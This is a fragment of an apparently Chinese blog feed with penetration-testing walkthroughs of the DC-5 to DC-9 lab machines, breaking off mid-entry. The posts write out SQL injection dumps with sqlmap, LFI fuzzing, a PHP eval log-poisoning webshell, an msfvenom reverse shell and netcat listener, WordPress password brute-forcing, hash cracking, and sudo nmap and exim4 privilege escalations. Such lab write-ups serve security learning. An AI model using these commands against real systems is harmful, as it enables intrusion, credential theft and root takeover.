        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.137</p><p>靶机IP：192.168.56.138</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -A -sS -p- 192.168.56.138 -oA .&#x2F;Desktop&#x2F;Dc-9&#x2F;Dc-9</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815b458884" alt="image-20210103193229403"></p><p>开放 22 80</p><p>22 ssh 存在过滤</p><p>80 web </p><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p><img src="https://img.rruu.net/image/603815bc87508" alt="image-20210103193505462"></p><p>使用burpsuite抓包测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">burpsuite</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815c38b691" alt="image-20210103193906664"></p><p>经过测试，payload为 ‘+and+1=2%23 我们使用sqlmap进一步测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815caa1619" alt="image-20210103194440184"></p><p>获取数据库数据，解密结果为 transorbital1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql -D Staff -T Users --dump</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815d1081ef" alt="image-20210103194820884"></p><p>继续获取users数据库的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql -D users -T UserDetails --dump</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815d6e824b" alt="image-20210103195002551"></p><p>清洗并保存数据</p><p>保存用户名：自己使用vim去除掉第一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F &#39;,&#39; &#39;&#123;print $5&#125;&#39; &#x2F;home&#x2F;user&#x2F;.local&#x2F;share&#x2F;sqlmap&#x2F;output&#x2F;192.168.56.138&#x2F;dump&#x2F;users&#x2F;UserDetails.csv &gt; username.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815ddc2185" alt="image-20210103200943570"></p><p>保存密码：自己使用vim去除掉第一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F &#39;,&#39; &#39;&#123;print $3&#125;&#39; &#x2F;home&#x2F;user&#x2F;.local&#x2F;share&#x2F;sqlmap&#x2F;output&#x2F;192.168.56.138&#x2F;dump&#x2F;users&#x2F;UserDetails.csv &gt; password.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815e575c2e" alt="image-20210103200930963"></p><p>使用admin登录</p><p><img src="https://img.rruu.net/image/603815ec6dced" alt="image-20210103201048661"></p><p>发现下面有一串字符，提醒我们file文件不存在，可能存在文件包含，我们使用wfuzz测试漏洞，因为没有参数，我们根据经验确定为file或者filename。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w &#x2F;usr&#x2F;share&#x2F;fuzzDicts&#x2F;ssrfDicts&#x2F;lfi-scanner.txt -z list,&quot;file-filename&quot; -b &quot;PHPSESSID&#x3D;8kqpan1janoj3h0memoclfuimi&quot; --hh 1341 http:&#x2F;&#x2F;192.168.56.138&#x2F;manage.php?FUZ2Z&#x3D;FUZZ</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815f279e59" alt="image-20210103205749348"></p><p>尝试fuzz日志包含文件getshell，失败。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w &#x2F;usr&#x2F;share&#x2F;fuzzDicts&#x2F;ssrfDicts&#x2F;log.txt -b &quot;PHPSESSID&#x3D;8kqpan1janoj3h0memoclfuimi&quot; --hh 1341 http:&#x2F;&#x2F;192.168.56.138&#x2F;manage.php?file&#x3D;FUZZ</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815f862caf" alt="image-20210103212010508"></p><p>这里我们尝试读取一下 /etc/knockd.conf 上面的意思是说按照 7469 8475 9842 的顺序即可开启ssh端口</p><p><img src="https://img.rruu.net/image/603815fea12e7" alt="image-20210103212155412"></p><p>使用nmap发起端口请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for x in 7469 8475 9842; do nmap -Pn --max-retries 0 -p $x 192.168.56.138; done</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DC-8</title>
      <link href="2021/01/13/DC-8/"/>
      <url>2021/01/13/DC-8/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p><p>靶机IP：192.168.56.136</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oA DC-8 192.168.56.136</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815aca723b" alt="image-20210102140533518"></p><p>开放端口： 22 80</p><p>22 ssh</p><p>80 web drupal7</p><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.56.136</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815b33d085" alt="image-20210102141412655"></p><p>使用msf进行测试，发现不存在漏洞。</p><p><img src="https://img.rruu.net/image/603815b9b5b13" alt="image-20210102141507409"></p><h3 id="挖掘sql注入"><a href="#挖掘sql注入" class="headerlink" title="挖掘sql注入"></a>挖掘sql注入</h3><p>打开网页</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.136&#x2F;?nid&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815bfa4ef0" alt="image-20210102141907738"></p><p>加入单引号，发现其报错信息，进一步测试。</p><p><img src="https://img.rruu.net/image/603815c6ebca7" alt="image-20210102141924279"></p><p>使用wfuzz发现，payload为 1 and 1=1</p><p><img src="https://img.rruu.net/image/603815cd50364" alt="image-20210102142402195"></p><p>使用sqlmap进行测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.56.136&#x2F;?nid&#x3D;1&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815d4d6dd5" alt="image-20210102142600720"></p><p>检索数据库</p><p><img src="https://img.rruu.net/image/603815dbf1d35" alt="image-20210102143912320"></p><h3 id="使用hashcat破解hash"><a href="#使用hashcat破解hash" class="headerlink" title="使用hashcat破解hash"></a>使用hashcat破解hash</h3><p>破解不出来admin的密码，我们只能使用john用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 --force &#39;$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku&#x2F;3if&#x2F;oRVZJaz5mKC2vF&#39; &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -o hash.txt -m 7900</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815e4564d7" alt="image-20210102144512613"></p><h3 id="drupal-getshell"><a href="#drupal-getshell" class="headerlink" title="drupal getshell"></a>drupal getshell</h3><p>这里有一个细节要注意前面的字符不能丢啊</p><p><img src="https://img.rruu.net/image/603815ea470f1" alt="image-20210102145639912"></p><p>msf配置监听会话</p><p><img src="https://img.rruu.net/image/603815f04f3db" alt="image-20210102145339334"></p><p>提交触发反弹会话</p><p><img src="https://img.rruu.net/image/603815f6d1858" alt="image-20210102145417502"></p><p>反弹成功</p><p><img src="https://img.rruu.net/image/603815fc4b538" alt="image-20210102145652103"></p><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="python切换bash"><a href="#python切换bash" class="headerlink" title="python切换bash"></a>python切换bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603816018af25" alt="image-20210102152409085"></p><h3 id="exim4-suid提权"><a href="#exim4-suid提权" class="headerlink" title="exim4 suid提权"></a>exim4 suid提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603816066ebcf" alt="image-20210102153001039"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit exim4</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038160bcccd0" alt="image-20210102152455987"></p><p>将sh文件保存到tmp目录，给予执行权限。 <a href="https://www.exploit-db.com/exploits/46996">https://www.exploit-db.com/exploits/46996</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;shell.sh -m netcat</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603816111303c" alt="image-20210102153152607"></p><h3 id="获取flag文件"><a href="#获取flag文件" class="headerlink" title="获取flag文件"></a>获取flag文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603816169b7d6" alt="image-20210102153223982"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DC-7</title>
      <link href="2021/01/10/DC-7/"/>
      <url>2021/01/10/DC-7/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p><p>靶机IP：192.168.56.135</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oA DC-7 192.168.56.135</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815a63bce6" alt="image-20201230205134646"></p><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.56.135</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815addab45" alt="image-20201231220932765"></p><h3 id="dirsearch扫描目录"><a href="#dirsearch扫描目录" class="headerlink" title="dirsearch扫描目录"></a>dirsearch扫描目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -e php -u http:&#x2F;&#x2F;192.168.56.135</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815b44ab07" alt="image-20201231221853697"></p><p>没有任何有价值的信息，存在很多误报。</p><h3 id="搜索用户信息"><a href="#搜索用户信息" class="headerlink" title="搜索用户信息"></a>搜索用户信息</h3><p>发现用户github，对github进行查看。</p><p><img src="https://img.rruu.net/image/603815bc79fe0" alt="image-20201231222514074"></p><p>查看github</p><p><img src="https://img.rruu.net/image/603815c3a7d4b" alt="image-20210101155159331"></p><p>发现config.php中的密码与用户</p><p><img src="https://img.rruu.net/image/603815c9e682a" alt="image-20210101155334416"></p><h3 id="ssh登录目标"><a href="#ssh登录目标" class="headerlink" title="ssh登录目标"></a>ssh登录目标</h3><p>密码：MdR3xOgB7#dW 用户：dc7user</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh dc7user@192.168.56.135</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815cfa0434" alt="image-20210101171217499"></p><p>登录进来，ssh提醒我们有新的邮件，从邮件中我们得知，backups.sh会以root权限执行，每隔一段时间。</p><p><img src="https://img.rruu.net/image/603815d704a8f" alt="image-20210101172235622"></p><p>我们查看backups.sh的权限，发现需要www权限，所以我们需要通过webgetshell，然后修改。我们需要先重置drupal的用户名密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin --password&#x3D;admin</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815ddecd71" alt="image-20210101172626525"></p><p>然后登录后台，我们需要使用一个插件。<a href="https://www.drupal.org/project/php">https://www.drupal.org/project/php</a> 下载下来，然后上传。</p><p><img src="https://img.rruu.net/image/603815e5f1ee6" alt="image-20210101173100099"></p><p>记得把这个勾选上，然后拉到下面选择安装。</p><p><img src="https://img.rruu.net/image/603815ed3b3c2" alt="image-20210101173312383"></p><p>然后随便新建一个文章，然后选择phpcode，然后save即可反弹shell。</p><p><img src="https://img.rruu.net/image/603815f37a768" alt="image-20210101162232588"></p><p>msf配置监听会话</p><p><img src="https://img.rruu.net/image/603815f9a2529" alt="image-20210101173551827"></p><p>修改backups文件内容，使其反弹shell。</p><p><img src="https://img.rruu.net/image/603815ff3f353" alt="image-20210101173708423"></p><p>kali监听会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/60381604e0b0e" alt="image-20210101173748131"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DC-6</title>
      <link href="2021/01/08/DC-6/"/>
      <url>2021/01/08/DC-6/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p><p>靶机IP：192.168.56.134</p><p>修改一下hosts如下：</p><p><img src="https://img.rruu.net/image/6038158ff3dd9" alt="image-20201230092436969"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oA DC-6 192.168.56.134</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038159daf7bd" alt="image-20201230092506200"></p><p>开放端口 80 22</p><p>22 ssh</p><p>80 http</p><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>火狐打开看看，经验判断是一个wordpress</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;wordy</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815a4f19eb" alt="image-20201230092615057"></p><h3 id="dirsearch扫描目录"><a href="#dirsearch扫描目录" class="headerlink" title="dirsearch扫描目录"></a>dirsearch扫描目录</h3><p>很明显是一个wordpress</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .&#x2F;tools&#x2F;dirsearch&#x2F;dirsearch.py -e php --full-url -t 50  -u http:&#x2F;&#x2F;wordy</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815af5c332" alt="image-20201230092654308"></p><p>后台地址：<a href="http://wordy/wp-login.php">http://wordy/wp-login.php</a></p><h3 id="wpscan检测web站点"><a href="#wpscan检测web站点" class="headerlink" title="wpscan检测web站点"></a>wpscan检测web站点</h3><p>这里的apitoken你们自己去申请，免费的。<a href="https://wpscan.com/">https://wpscan.com/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;wordy --enumerate u,vp --api-token H6G9ulWiQ --plugins-detection aggressive</span><br></pre></td></tr></table></figure><p>枚举用户名</p><p><img src="https://img.rruu.net/image/603815b5e94a0" alt="image-20201230095331544"></p><p>发现rce漏洞，这个漏洞需要一个普通用户，我们使用wpscan爆破吧。</p><p><img src="https://img.rruu.net/image/603815bce80c8" alt="image-20201230095413940"></p><p>在使用wpscan爆破之前，我们需要留意一下作者给的说明。意思是，要是我们不想等待某个过程很长时间，就使用这条命令生成一个字典，这个字典他也没有明确告诉我们要干嘛，但是这个字典名字就是密码，所以我们用来当作密码字典吧。</p><p>OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.</p><p>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure><p>执行如下命令，开始爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;wordy -U jens,graham,mark,sarah -P .&#x2F;passwords.txt -t 50</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815c53fe67" alt="image-20201230100635240"></p><h4 id="MSF利用漏洞"><a href="#MSF利用漏洞" class="headerlink" title="MSF利用漏洞"></a>MSF利用漏洞</h4><p>配置如下：</p><p><img src="https://img.rruu.net/image/603815cc9e732" alt="image-20201230100736110"></p><p>要设置forceexploit为true，然后运行，即可返回shell。</p><p><img src="https://img.rruu.net/image/603815d316b6e" alt="image-20201230100719906"></p><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="python切换bash"><a href="#python切换bash" class="headerlink" title="python切换bash"></a>python切换bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815d9ca090" alt="image-20201230101612560"></p><h3 id="收集home目录信息"><a href="#收集home目录信息" class="headerlink" title="收集home目录信息"></a>收集home目录信息</h3><p>发现密码，我们使用ssh登录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat things-to-do.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815dec6519" alt="image-20201230102012272"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh graham@192.168.56.134</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815e63bb99" alt="image-20201230102107407"></p><h3 id="sh文件劫持"><a href="#sh文件劫持" class="headerlink" title="sh文件劫持"></a>sh文件劫持</h3><p>查看用户权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815ec97c56" alt="image-20201230102710382"></p><p>查看sudo配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815f20a5d6" alt="image-20201230102618640"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat backups.sh</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815f781474" alt="image-20201230102549087"></p><p>查看权限，发现我们拥有rwx权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815fd6a3af" alt="image-20201230102648801"></p><p>切换jens用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;&#x2F;bin&#x2F;bash&#39; &gt; backups.sh</span><br><span class="line">sudo -u jens .&#x2F;backups.sh</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/60381602a7ece" alt="image-20201230102917791"></p><h3 id="sudo-nmap提权"><a href="#sudo-nmap提权" class="headerlink" title="sudo nmap提权"></a>sudo nmap提权</h3><p>查看sudo配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038160776be6" alt="image-20201230103015983"></p><p>nmap提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF&#x3D;$(mktemp)</span><br><span class="line">echo &#39;os.execute(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; &gt; $TF</span><br><span class="line">sudo nmap --script&#x3D;$TF</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038160caba3c" alt="image-20201230103302639"></p><p>获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/60381611a9982" alt="image-20201230103339435"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DC-5</title>
      <link href="2021/01/06/DC-5/"/>
      <url>2021/01/06/DC-5/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p><p>靶机IP：192.168.56.131</p><p>修改一下hosts如下：</p><p><img src="https://img.rruu.net/image/6038157a4fdfd" alt="image-20201229145037243"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oA DC-5 192.168.56.131</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815805dcd5" alt="image-20201229145147871"></p><p>开放 80 111</p><p>80 http</p><p>111 rpcbind</p><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>firefox打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.56.131&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/60381586789a2" alt="image-20201229145246969"></p><h3 id="cmseek识别cms"><a href="#cmseek识别cms" class="headerlink" title="cmseek识别cms"></a>cmseek识别cms</h3><p>未识别出来，目测是自己开发的cms，或者小众的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmseek</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038158d02252" alt="image-20201229145311854"></p><h3 id="dirsearch爆破目录"><a href="#dirsearch爆破目录" class="headerlink" title="dirsearch爆破目录"></a>dirsearch爆破目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u http:&#x2F;&#x2F;192.168.56.131</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815936a039" alt="image-20201229145416061"></p><p>未发现有价值的目录，初步对网站进行踩点也并未发现任何可疑的地方，网站不寻常，我们也要采用不寻常的攻击思路。这里经过测试，是不存在sql注入的。目前来说我们应该是没办法进行渗透了。</p><p><img src="https://img.rruu.net/image/60381599440dd" alt="image-20201229145610765"></p><h3 id="Wfuzz挖掘文件包含"><a href="#Wfuzz挖掘文件包含" class="headerlink" title="Wfuzz挖掘文件包含"></a>Wfuzz挖掘文件包含</h3><p>我们爆破参数，获取到file参数，我们对file参数进行测试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;fuzzDicts&#x2F;paramDict&#x2F;parameter.txt --hh 851 http:&#x2F;&#x2F;192.168.56.131&#x2F;thankyou.php?FUZZ&#x3D;asdf</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038159e64864" alt="image-20201229145723838"></p><p>根据经验file参数可能存在包含漏洞。使用wfuzz测试，发现确实存在漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;fuzzdb&#x2F;attack&#x2F;lfi&#x2F;JHADDIX_LFI.txt --hh 835 http:&#x2F;&#x2F;192.168.56.131&#x2F;thankyou.php?file&#x3D;FUZZ</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815a45daa7" alt="image-20201229153106942"></p><h3 id="文件包含漏洞利用"><a href="#文件包含漏洞利用" class="headerlink" title="文件包含漏洞利用"></a>文件包含漏洞利用</h3><p>我们尝试日志包含，使用wfuzz探测日志目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;fuzzdb&#x2F;attack&#x2F;lfi&#x2F;common-unix-httpd-log-locations.txt --hh 835 http:&#x2F;&#x2F;192.168.56.131&#x2F;thankyou.php?file&#x3D;FUZZ</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815ab716e8" alt="image-20201229154342045"></p><p>使用burpsuite访问制造错误日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.131&#x2F;&lt;%3fphp+eval($_POST[&#39;test&#39;])%3b%3f&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815b1455b8" alt="image-20201229154917916"></p><p>msf生成shell，burpsuite发包直接返回shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.56.105 LPORT&#x3D;9000 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815b71913a" alt="image-20201229173000787"></p><p>这里换成get方式，我这里操作失误，导致我自己重开了一台机器。ip也发生了变化</p><p><img src="https://img.rruu.net/image/603815bd5908f" alt="image-20201229175622137"></p><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="python切换bash"><a href="#python切换bash" class="headerlink" title="python切换bash"></a>python切换bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815c6156da" alt="image-20201229175707443"></p><p>查找具有suid权限的文件，发现screen存在异常，我们搜索相关漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815cdbeabf" alt="image-20201229191424194"></p><h3 id="screen-4-5特权提升漏洞利用"><a href="#screen-4-5特权提升漏洞利用" class="headerlink" title="screen 4.5特权提升漏洞利用"></a>screen 4.5特权提升漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 